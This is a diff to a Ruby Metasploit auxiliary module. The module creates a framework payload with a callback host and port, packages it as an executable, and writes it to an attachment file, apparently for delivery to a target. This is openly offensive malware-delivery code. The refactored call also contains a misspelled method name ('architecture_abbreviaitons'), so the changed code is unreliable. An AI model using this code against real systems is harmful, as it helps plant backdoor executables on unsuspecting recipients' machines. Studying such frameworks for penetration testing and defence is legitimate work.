@@ -132,24 +132,26 @@ class Metasploit3 < Msf::Auxiliary
       attachment_file_name = msf_filename
 
       print_status("Creating payload...")
-      mod = framework.payloads.create(msf_payload)
-      if (not mod)
+      payload_instance = framework.payloads.create(msf_payload)
+
+      unless payload_instance
         print_error("Failed to create payload, #{msf_payload}")
+
         return
       end
 
       # By not passing an explicit encoder, we're asking the
       # framework to pick one for us.  In general this is the best
       # way to encode.
-      buf = mod.generate_simple(
+      code = payload_instance.generate_simple(
           'Format'  => 'raw',
           'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
         )
-      exe = generate_payload_exe({
-          :code => buf,
-          :arch => mod.arch,
-          :platform => mod.platform
-        })
+      exe = generate_payload_exe(
+          architecture_abbreviations: payload_instance.architecture_abbreviaitons,
+          code: code,
+          platforms: payload_instance.platform_list.platforms
+      )
 
       print_status("Writing payload to #{attachment_file}")
       # XXX If Rex::Zip will let us zip a buffer instead of a file,
